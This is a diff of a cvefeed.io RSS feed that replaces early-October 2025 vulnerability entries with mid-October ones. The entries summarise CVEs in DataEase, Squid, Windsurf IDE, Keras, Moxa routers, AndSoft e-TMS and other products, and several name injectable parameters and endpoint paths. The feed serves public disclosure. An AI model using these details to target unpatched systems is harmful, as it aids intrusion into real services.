+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-62422 - DataEase SQL injection vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62422</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 18:15:37 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62422
+ Oct. 17, 2025, 6:15 p.m. | 16 hours, 23 minutes ago
+DataEase is an open source data visualization and analytics platform. In versions 2.10.13 and earlier, the /de2api/datasetData/tableField interface is vulnerable to SQL injection. An attacker can construct a malicious tableName parameter to execute arbitrary SQL commands. This issue is fixed in version 2.10.14. No known workarounds exist.
+ 8.7 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-62168 - Squid vulnerable to information disclosure via authentication credential leakage in error handling</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62168</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 17:15:49 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62168
+ Oct. 17, 2025, 5:15 p.m. | 17 hours, 23 minutes ago
+Squid is a caching proxy for the Web. In Squid versions prior to 7.2, a failure to redact HTTP authentication credentials in error handling allows information disclosure. The vulnerability allows a script to bypass browser security protections and learn the credentials a trusted client uses to authenticate. This potentially allows a remote client to identify security tokens or credentials used internally by a web application using Squid for backend load balancing. These attacks do not require Squid to be configured with HTTP authentication. The vulnerability is fixed in version 7.2. As a workaround, disable debug information in administrator mailto links generated by Squid by configuring squid.conf with email_err_data off.
+ 10.0 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-62353 - Windsurf IDE Path Traversal Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62353</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 16:15:39 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62353
+ Oct. 17, 2025, 4:15 p.m. | 18 hours, 23 minutes ago
+A path traversal vulnerability in all versions of the Windsurf IDE enables a threat actor to read and write arbitrary local files in and outside of current projects on an end user’s system. The vulnerability can be reached directly and through indirect prompt injection.
+ 9.8 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-8414 - Zigbee Green Power Host Buffer Overflow Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-8414</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 16:15:39 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-8414
+ Oct. 17, 2025, 4:15 p.m. | 18 hours, 23 minutes ago
+Due to improper input validation, a buffer overflow vulnerability is present in 
+
+Zigbee EZSP Host Applications. If the buffer overflows, stack corruption is possible. In certain
+
+conditions, this could lead to arbitrary code execution. Access to a network key is required to exploit this vulnerability.
  9.4 | CRITICAL
 
 Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-59741 - Multiple vulnerabilities in AndSoft&apos;s e-TMS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-59741</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 15:15:53 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-59741
- Oct. 2, 2025, 3:15 p.m. | 16 hours, 59 minutes ago
-Operating system command injection vulnerability in AndSoft's e-TMS v25.03. This vulnerability allows an attacker to execute operating system commands on the server by sending a POST request. The relationship between parameter and assigned identifier is a 'm' parameter in '/CLT/LOGINERRORFRM.ASP'.
+]]></content:encoded></item><item><title>CVE-2025-57567 - PluXml CMS Theme Editor Remote Code Execution (RCE)</title><link>https://cvefeed.io/vuln/detail/CVE-2025-57567</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 16:15:38 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-57567
+ Oct. 17, 2025, 4:15 p.m. | 18 hours, 23 minutes ago
+A remote code execution (RCE) vulnerability exists in the PluXml CMS theme editor, specifically in the minify.php file located under the default theme directory (/themes/defaut/css/minify.php). An authenticated administrator user can overwrite this file with arbitrary PHP code via the admin panel, enabling execution of system commands.
+ 9.1 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-60279 - Illia Cloud illia-Builder SSRF Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-60279</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 16:15:38 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-60279
+ Oct. 17, 2025, 4:15 p.m. | 18 hours, 23 minutes ago
+A server-side request forgery (SSRF) vulnerability in Illia Cloud illia-Builder before v4.8.5 allows authenticated users to send arbitrary requests to internal services via the API. An attacker can leverage this to enumerate open ports based on response discrepancies and interact with internal services.
+ 9.6 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-26625 - Git LFS may write to arbitrary files via crafted symlinks</title><link>https://cvefeed.io/vuln/detail/CVE-2025-26625</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 16:15:37 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-26625
+ Oct. 17, 2025, 4:15 p.m. | 18 hours, 23 minutes ago
+Git LFS is a Git extension for versioning large files. In Git LFS versions 0.5.2 through 3.7.0, when populating a Git repository's working tree with the contents of Git LFS objects, certain Git LFS commands may write to files visible outside the current Git working tree if symbolic or hard links exist which collide with the paths of files tracked by Git LFS. The git lfs checkout and git lfs pull commands do not check for symbolic links before writing to files in the working tree, allowing an attacker to craft a repository containing symbolic or hard links that cause Git LFS to write to arbitrary file system locations accessible to the user running these commands. As well, when the git lfs checkout and git lfs pull commands are run in a bare repository, they could write to files visible outside the repository. The vulnerability is fixed in version 3.7.1. As a workaround, support for symlinks in Git may be disabled by setting the core.symlinks configuration option to false, after which further clones and fetches will not create symbolic links. However, any symbolic or hard links in existing repositories will still provide the opportunity for Git LFS to write to their targets.
+ 8.6 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-49655 - Keras TorchModuleWrapper Deserialization Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-49655</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 16:15:37 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-49655
+ Oct. 17, 2025, 4:15 p.m. | 18 hours, 23 minutes ago
+Deserialization of untrusted data can occur in versions of the Keras framework running versions 3.11.0 up to but not including 3.11.3, enabling a maliciously uploaded Keras file containing a TorchModuleWrapper class to run arbitrary code on an end user’s system when loaded despite safe mode being enabled. The vulnerability can be triggered through both local and remote files.
  9.8 | CRITICAL
 
 Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-59742 - Multiple vulnerabilities in AndSoft&apos;s e-TMS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-59742</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 15:15:53 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-59742
- Oct. 2, 2025, 3:15 p.m. | 16 hours, 59 minutes ago
-SQL injection vulnerability in AndSoft's e-TMS v25.03. This vulnerability could allow an attacker to retrieve, create, update, and delete databases by sending a POST request. The relationship between parameter and assigned identifier is a 'USRMAIL' parameter in'/inc/login/TRACK_REQUESTFRMSQL.ASP'.
+]]></content:encoded></item><item><title>CVE-2025-55085 - Web http client: Unchecked Server-Side Malicious Packet Issue</title><link>https://cvefeed.io/vuln/detail/CVE-2025-55085</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 14:22:28 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-55085
+ Oct. 17, 2025, 3:15 p.m. | 19 hours, 23 minutes ago
+In NextX Duo before 6.4.4, in the HTTP client module, the network support code for Eclipse Foundation ThreadX, the parsing of HTTP header fields was missing bounds verification. A crafted server response could cause undefined behavior.
+ 8.8 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-48044 - Authorization bypass when bypass policy condition evaluates to true</title><link>https://cvefeed.io/vuln/detail/CVE-2025-48044</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 14:15:46 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-48044
+ Oct. 17, 2025, 2:15 p.m. | 20 hours, 23 minutes ago
+Incorrect Authorization vulnerability in ash-project ash allows Authentication Bypass. This vulnerability is associated with program files lib/ash/policy/policy.ex and program routines 'Elixir.Ash.Policy.Policy':expression/2.
+
+This issue affects ash: from pkg:hex/ash@3.6.3 before pkg:hex/ash@3.7.1, from 3.6.3 before 3.7.1, from 79749c2685ea031ebb2de8cf60cc5edced6a8dd0 before 8b83efa225f657bfc3656ad8ee8485f9b2de923d.
+ 8.6 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2023-28815 - Hikvision iSecure Center Command Injection Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2023-28815</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 12:15:37 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2023-28815
+ Oct. 17, 2025, 12:15 p.m. | 22 hours, 23 minutes ago
+Some versions of Hikvision's iSecure Center Product contain insufficient parameter validation, resulting in a command injection vulnerability. Attackers may exploit this to gain platform privileges and execute arbitrary commands on the system.iSecure Center is software released for China's domestic market only, with no overseas release.
  9.8 | CRITICAL
 
 Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-59743 - Multiple vulnerabilities in AndSoft&apos;s e-TMS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-59743</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 15:15:53 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-59743
- Oct. 2, 2025, 3:15 p.m. | 16 hours, 59 minutes ago
-SQL injection vulnerability in AndSoft's e-TMS v25.03. This vulnerability could allow an attacker to retrieve, create, update, and delete databases by sending a POST request. The relationship between parameter and assigned identifier is a 'SessionID' cookie  in '/inc/connect/CONNECTION.ASP'.
+]]></content:encoded></item><item><title>CVE-2023-28814 - Hikvision iSecure Center Improper File Upload Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2023-28814</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 11:15:33 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2023-28814
+ Oct. 17, 2025, 11:15 a.m. | 23 hours, 23 minutes ago
+Some versions of Hikvision's iSecure Center Product have an improper file upload control vulnerability. Due to the improper verification of file to be uploaded, attackers may upload malicious files to the server. iSecure Center is software released for China's domestic market only, with no overseas release.
  9.8 | CRITICAL
 
 Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-59744 - Multiple vulnerabilities in AndSoft&apos;s e-TMS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-59744</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 15:15:53 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-59744
- Oct. 2, 2025, 3:15 p.m. | 16 hours, 59 minutes ago
-Path traversal vulnerability in AndSoft's e-TMS v25.03. This vulnerability allows an attacker to access files only within the web root using the “docurl” parameter in “/lib/asp/DOCSAVEASASP.ASP”.
- 8.7 | HIGH
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-59735 - Multiple vulnerabilities in AndSoft&apos;s e-TMS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-59735</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 14:15:46 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-59735
- Oct. 2, 2025, 2:15 p.m. | 17 hours, 59 minutes ago
-Operating system command injection vulnerability in AndSoft's e-TMS v25.03. This vulnerability allows an attacker to execute operating system commands on the server by sending a POST request. The relationship between parameter and assigned identifier is a 'm' parameter in '/clt/LOGINFRM.ASP'.
- 9.8 | CRITICAL
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-59736 - Multiple vulnerabilities in AndSoft&apos;s e-TMS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-59736</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 14:15:46 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-59736
- Oct. 2, 2025, 2:15 p.m. | 17 hours, 59 minutes ago
-Operating system command injection vulnerability in AndSoft's e-TMS v25.03. This vulnerability allows an attacker to execute operating system commands on the server by sending a POST request. The relationship between parameter and assigned identifier is a 'm' parameter in '/clt/LOGINFRM_DJO.ASP'.
- 9.8 | CRITICAL
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-59737 - Multiple vulnerabilities in AndSoft&apos;s e-TMS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-59737</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 14:15:46 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-59737
- Oct. 2, 2025, 2:15 p.m. | 17 hours, 59 minutes ago
-Operating system command injection vulnerability in AndSoft's e-TMS v25.03. This vulnerability allows an attacker to execute operating system commands on the server by sending a POST request. The relationship between parameter and assigned identifier is a 'm' parameter in '/clt/LOGINFRM_LXA.ASP'.
- 9.8 | CRITICAL
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-59738 - Multiple vulnerabilities in AndSoft&apos;s e-TMS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-59738</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 14:15:46 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-59738
- Oct. 2, 2025, 2:15 p.m. | 17 hours, 59 minutes ago
-Operating system command injection vulnerability in AndSoft's e-TMS v25.03. This vulnerability allows an attacker to execute operating system commands on the server by sending a POST request. The relationship between parameter and assigned identifier is a 'm' parameter in '/clt/LOGINFRM_BET.ASP'.
- 9.8 | CRITICAL
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-59739 - Multiple vulnerabilities in AndSoft&apos;s e-TMS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-59739</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 14:15:46 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-59739
- Oct. 2, 2025, 2:15 p.m. | 17 hours, 59 minutes ago
-Operating system command injection vulnerability in AndSoft's e-TMS v25.03. This vulnerability allows an attacker to execute operating system commands on the server by sending a POST request. The relationship between parameter and assigned identifier is a 'm' parameter in '/clt/LOGINFRM_original.ASP'.
- 9.8 | CRITICAL
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2025-59740 - Multiple vulnerabilities in AndSoft&apos;s e-TMS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-59740</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 14:15:46 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-59740
- Oct. 2, 2025, 2:15 p.m. | 17 hours, 59 minutes ago
-Operating system command injection vulnerability in AndSoft's e-TMS v25.03. This vulnerability allows an attacker to execute operating system commands on the server by sending a POST request. The relationship between parameter and assigned identifier is a 'm' parameter in '/clt/LOGINFRM_CAT.ASP'.
- 9.8 | CRITICAL
-
-Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>$20 YoLink IoT Gateway Vulnerabilities Put Home Security at Risk</title><link>https://hackread.com/20-yolink-iot-gateway-vulnerabilities-home-security/</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 14:05:20 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            Cybersecurity researchers at Bishop Fox have revealed security vulnerabilities in the popular, inexpensive YoLink Smart Hub (v0382), leaving users exposed to remote attackers. The hub that costs just  ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>PoC exploit Released for VMware Workstation guest-to-host escape Vulnerability</title><link>https://cybersecuritynews.com/vmware-workstation-vulnerability/</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 14:00:35 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[PoC exploit Released for VMware Workstation guest-to-host escape Vulnerability
-            A proof-of-concept (PoC) exploit has been released for a critical vulnerability chain in VMware Workstation that allows an attacker to escape from a guest virtual machine and execute arbitrary code on ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Chrome 141 Stable Channel Release</title><link>https://thecyberthrone.in/2025/10/02/chrome-141-stable-channel-release/</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 13:32:30 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            October 2, 2025Chrome 141 has arrived, bringing a robust set of 21 security fixes to safeguard users from critical vulnerabilities. This blog post summarizes all key updates, highlights the most impor ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>CVE-2025-41064 - Incorrect authentication in GTT´s group OpenSIAC</title><link>https://cvefeed.io/vuln/detail/CVE-2025-41064</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 12:15:29 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-41064
- Oct. 2, 2025, 12:15 p.m. | 20 hours ago
-Incorrect authentication vulnerability in OpenSIAC, which could allow an attacker to impersonate a person using Cl@ve as an authentication method.
+]]></content:encoded></item><item><title>CVE-2025-11849 - Mammoth Directory Traversal Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-11849</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 05:15:33 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-11849
+ Oct. 17, 2025, 5:15 a.m. | 1 day, 4 hours ago
+Versions of the package mammoth from 0.3.25 and before 1.11.0; versions of the package mammoth from 0.3.25 and before 1.11.0; versions of the package mammoth before 1.11.0; versions of the package org.zwobble.mammoth:mammoth before 1.11.0 are vulnerable to Directory Traversal due to the lack of path or file type validation when processing a docx file containing an image with an external link (r:link attribute instead of embedded r:embed). The library resolves the URI to a file path and after reading, the content is encoded as base64 and included in the HTML output as a data URI. An attacker can read arbitrary files on the system where the conversion is performed or cause an excessive resources consumption by crafting a docx file that links to special device files such as /dev/random or /dev/zero.
  9.3 | CRITICAL
 
 Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>CVE-2024-58267 - Rancher CLI SAML authentication is vulnerable to phishing attacks</title><link>https://cvefeed.io/vuln/detail/CVE-2024-58267</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 12:15:28 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2024-58267
- Oct. 2, 2025, 12:15 p.m. | 19 hours, 42 minutes ago
-A vulnerability has been identified within Rancher Manager whereby the SAML authentication from the Rancher CLI  tool is vulnerable to phishing attacks. The custom authentication protocol for SAML-based providers can be abused to steal Rancher’s authentication tokens.
- 8.0 | HIGH
+]]></content:encoded></item><item><title>CVE-2025-6950 - Moxa Network Security Appliances and Routers Hard-Coded Credentials JWT Forgery</title><link>https://cvefeed.io/vuln/detail/CVE-2025-6950</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 04:16:14 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-6950
+ Oct. 17, 2025, 4:16 a.m. | 1 day, 1 hour ago
+An Use of Hard-coded Credentials vulnerability has been identified in Moxa’s network security appliances and routers. The system employs a hard-coded secret key to sign JSON Web Tokens (JWT) used for authentication. This insecure implementation allows an unauthenticated attacker to forge valid tokens, thereby bypassing authentication controls and impersonating any user. Exploitation of this vulnerability can result in complete system compromise, enabling unauthorized access, data theft, and full administrative control over the affected device. While successful exploitation can severely impact the confidentiality, integrity, and availability of the affected device itself, there is no loss of confidentiality or integrity within any subsequent systems.
+ 9.9 | CRITICAL
 
 Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>ThreatsDay Bulletin: CarPlay Exploit, BYOVD Tactics, SQL C2 Attacks, iCloud Backdoor Demand &amp; More</title><link>https://thehackernews.com/2025/10/threatsday-bulletin-carplay-exploit.html</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 11:30:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[ThreatsDay Bulletin: CarPlay Exploit, BYOVD Tactics, SQL C2 Attacks, iCloud Backdoor Demand & More]]></content:encoded></item><item><title>CVE-2025-40645 - Exposure of sensitive information in Viday</title><link>https://cvefeed.io/vuln/detail/CVE-2025-40645</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 10:15:36 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-40645
- Oct. 2, 2025, 10:15 a.m. | 21 hours, 42 minutes ago
-Exposure of sensitive information in Viday. This vulnerability could allow an unauthenticated attacker to obtain sensitive information about customers by sending an HTTP GET request to “/api/reserva/web/clients” using the “phone” parameter.
+]]></content:encoded></item><item><title>CVE-2025-6949 - Moxa Network Security Appliances and Routers Privilege Escalation Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-6949</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 04:16:12 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-6949
+ Oct. 17, 2025, 4:16 a.m. | 1 day, 1 hour ago
+An Execution with Unnecessary Privileges vulnerability has been identified in Moxa’s network security appliances and routers. A critical authorization flaw in the API allows an authenticated, low-privileged user to create a new administrator account, including accounts with usernames identical to existing users. In certain scenarios, this vulnerability could allow an attacker to gain full administrative control over the affected device, leading to potential account impersonation. While successful exploitation can severely impact the confidentiality, integrity, and availability of the affected device itself, there is no loss of confidentiality or integrity within any subsequent systems.
+ 9.3 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-11900 - HGiga｜iSherlock - OS Command Injection</title><link>https://cvefeed.io/vuln/detail/CVE-2025-11900</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 04:16:07 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-11900
+ Oct. 17, 2025, 4:16 a.m. | 17 hours, 45 minutes ago
+The iSherlock developed by HGiga has an OS Command Injection vulnerability, allowing unauthenticated remote attackers to inject arbitrary OS commands and execute them on the server.
+ 9.8 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-11899 - Flowring Technology｜Agentflow - Use of Hard-coded Cryptographic Key</title><link>https://cvefeed.io/vuln/detail/CVE-2025-11899</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 04:16:06 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-11899
+ Oct. 17, 2025, 4:16 a.m. | 17 hours, 45 minutes ago
+Agentflow developed by Flowring has an Use of Hard-coded Cryptographic Key vulnerability, allowing unauthenticated remote attackers to exploit the fixed key to generate verification information, thereby logging into the system as any user. Attacker must first obtain an user ID in order to exploit this vulnerability.
+ 9.2 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-11898 - Flowring Technology｜Agentflow - Arbitrary File Reading through Path Traversal</title><link>https://cvefeed.io/vuln/detail/CVE-2025-11898</link><author></author><category>vulns</category><pubDate>Fri, 17 Oct 2025 04:16:03 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-11898
+ Oct. 17, 2025, 4:16 a.m. | 17 hours, 45 minutes ago
+Agentflow developed by Flowring has an Arbitrary File Reading vulnerability, allowing unauthenticated remote attackers to exploit Relative Path Traversal to download arbitrary system files.
  8.7 | HIGH
 
 Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>Chrome Security Update – Patch for 21 Vulnerabilities that Allows Attackers to Crash Browser</title><link>https://cybersecuritynews.com/chrome-security-updates/</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 08:29:17 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            Google has released Chrome 141 to address 21 security vulnerabilities, including critical flaws that could allow attackers to crash browsers and potentially execute malicious code.
-The update, rolling ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Top Cyber Threat Trends of 2025 from Deepfakes, ClickFix, and ViewState Exploits</title><link>https://www.huntress.com/blog/craftiest-trends-scams-tradecraft-2025</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 05:00:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
-            Cloudflare Turnstile challenges leading to MetaStealer. Deepfake meetings impersonating company executives, which trick employees into downloading malicious extensions. Exposed ASP.NET machine keys th ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Multiple Splunk Enterprise Vulnerabilities Let Attackers Execute Unauthorized JavaScript code</title><link>https://cybersecuritynews.com/splunk-enterprise-vulnerabilities/</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 04:07:32 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[Multiple Splunk Enterprise Vulnerabilities Let Attackers Execute Unauthorized JavaScript code]]></content:encoded></item><item><title>Samsung and OpenAI Announce Strategic Alliance to Build Next-Generation Global AI Infrastructure</title><link>https://securityonline.info/samsung-and-openai-announce-strategic-alliance-to-build-next-generation-global-ai-infrastructure/</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 03:42:33 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[Samsung and OpenAI Announce Strategic Alliance to Build Next-Generation Global AI Infrastructure
-            Samsung data breach
-Samsung has announced a strategic partnership with OpenAI to jointly advance the development of global AI infrastructure. According to Samsung, OpenAI’s demand for memory is rising ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Clop extortion emails claim theft of Oracle E-Business Suite data</title><link>https://www.bleepingcomputer.com/news/security/clop-extortion-emails-claim-theft-of-oracle-e-business-suite-data/</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 03:13:58 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[Clop extortion emails claim theft of Oracle E-Business Suite data
-            Mandiant and Google are tracking a new extortion campaign where executives at multiple companies received emails claiming that sensitive data was stolen from their Oracle E-Business Suite systems
-Acco ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Qualcomm Wins “Complete Victory” Over Arm in Major Chip Licensing Lawsuit</title><link>https://securityonline.info/qualcomm-wins-complete-victory-over-arm-in-major-chip-licensing-lawsuit/</link><author></author><category>vulns</category><pubDate>Thu, 2 Oct 2025 02:43:23 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">CVE Feed Newsroom</source><content:encoded><![CDATA[
